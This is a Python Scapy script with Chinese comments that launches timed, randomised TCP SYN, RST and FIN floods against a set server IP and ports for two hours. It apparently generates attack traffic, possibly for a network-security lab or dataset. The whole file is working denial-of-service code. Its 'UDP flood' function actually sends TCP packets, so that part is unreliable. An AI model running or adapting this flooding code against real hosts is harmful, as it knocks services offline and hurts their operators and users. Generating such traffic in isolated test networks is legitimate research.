from scapy.all import IP, TCP, send
import random
import time
import threading
import internet_info
from numpy import sqrt
#setting
target_ip = "203.0.113.123" #"172.20.10.15" #要攻擊的server IP
running_time=2*60*60 #這個程式執行多久，單位為秒
show_sending_packet=True #顯示有沒有發送封包的訊息
attack_ratio=0.2 #攻擊佔的時間比例期望值
# ############################################################

def syn_flood():
    duration=random.uniform(5,15)  # 隨機生成攻擊持續時間
    target_port = 63209 #syn flood要攻擊的server port
    print(f"Sending TCP SYN flood to {target_ip}:{target_port}...")
    start_time= time.time()
    while True:
        if time.time() - start_time > duration:
            break
        ip_layer = IP(src=my_ip, dst=target_ip)  # 如果本機IP傳到本機IP，可能不會通過網卡
        tcp_layer = TCP(
            sport=random.randint(63000, 63020),
            dport=target_port,
            flags="S",
        )
        payload = 0 
        packet = ip_layer / tcp_layer / random._urandom(payload)
        send(packet, verbose=show_sending_packet)

def udp_flood():
    duration=random.uniform(10,16)  # 隨機生成攻擊持續時間
    target_port = 63211  # UDP flood要攻擊的server port
    print(f"Sending UDP flood to {target_ip}:{target_port}...")
    start_time = time.time()
    while True:  
        if time.time() - start_time > duration:
            break
        payload = random.randint(64, 1024)  # 隨機數據包長度
        pkt = IP(dst=target_ip) / TCP(dport=target_port) / random._urandom(payload)
        send(pkt, verbose=show_sending_packet)

def rst_flood():
    duration=random.uniform(5,30)  # 隨機生成攻擊持續時間
    target_port = 63212  # RST flood要攻擊的server port
    print(f"Sending TCP RST flood to {target_ip}:{target_port}...")
    start_time = time.time()
    while True:
        if time.time() - start_time > duration:
            break
        ip_layer = IP(src=my_ip, dst=target_ip)  # 如果本機IP傳到本機IP，可能不會通過網卡
        tcp_layer = TCP(
            sport=random.randint(63000, 63020),
            dport=target_port,
            flags="R",
        )
        payload=0
        packet = ip_layer / tcp_layer / random._urandom(payload)
        send(packet, verbose=show_sending_packet)

def fin_flood():
    duration=random.uniform(10,30)  # 隨機生成攻擊持續時間
    target_port = 63213  # FIN flood要攻擊的server port
    print(f"Sending TCP FIN flood to {target_ip}:{target_port}...")
    start_time = time.time()
    while True:
        if time.time() - start_time > duration:
            break
        ip_layer = IP(src=my_ip, dst=target_ip)  # 如果本機IP傳到本機IP，可能不會通過網卡
        tcp_layer = TCP(
            sport=random.randint(63000, 63020),
            dport=target_port,
            flags="F",
        )
        payload=0
        packet = ip_layer / tcp_layer / random._urandom(payload)
        send(packet, verbose=show_sending_packet)



def timer_worker():
    time.sleep(running_time)  # 等待指定的運行時間
    # 強制結束主程式（可視需求調整）
    import os
    os._exit(0)

if __name__ == "__main__":
    my_ip = internet_info.my_IP #獲取本機IP
    timer_thread = threading.Thread(target=timer_worker, daemon=True)  
    timer_thread.start()  # 啟動計時器
    attack_methods = [syn_flood]
    sleep_time=random.uniform(0,20*(1-attack_ratio)/attack_ratio)
    print("waiting for next attack ",sleep_time," sec...")
    time.sleep(sleep_time) 
    while True:
        attack_func = random.choice(attack_methods)
        attack_func()
        sleep_time=random.uniform(0,20*(1-attack_ratio)/attack_ratio)
        print("waiting for next attack ", sleep_time," sec...")
        time.sleep(sleep_time)  # 隨機等待時間，模擬攻擊間隔
    timer_thread.join()  # 等待計時器線程結束

